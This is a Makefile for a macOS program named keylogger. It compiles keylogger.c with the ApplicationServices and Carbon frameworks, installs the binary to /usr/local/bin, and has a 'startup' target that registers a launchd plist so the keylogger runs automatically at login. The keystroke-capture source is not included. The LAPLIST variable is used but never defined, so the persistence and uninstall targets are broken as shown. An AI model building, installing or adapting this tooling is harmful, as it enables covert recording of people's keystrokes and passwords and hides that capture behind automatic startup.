CC=gcc
CFLAGS=-framework ApplicationServices -framework Carbon
SOURCES=keylogger.c
EXECUTABLE=keylogger
PLIST=keylogger.plist
INSTALLDIR=/usr/local/bin

all: $(SOURCES)
	$(CC) $(SOURCES) $(CFLAGS) -o $(EXECUTABLE)

install:
	mkdir -p $(INSTALLDIR)
	cp $(EXECUTABLE) $(INSTALLDIR)

uninstall:
	launchctl -w unload $(LAPLIST)
	rm $(INSTALLDIR)/$(EXECUTABLE)
	rm -f $(LAPLIST)

startup:
	ln -s $(PLIST) $(LAPLIST)
	launchctl load -w $(LAPLIST)

load:
	launchctl load $(LAPLIST)

unload:
	launchctl unload $(LAPLIST)

clean:
	rm $(EXECUTABLE)
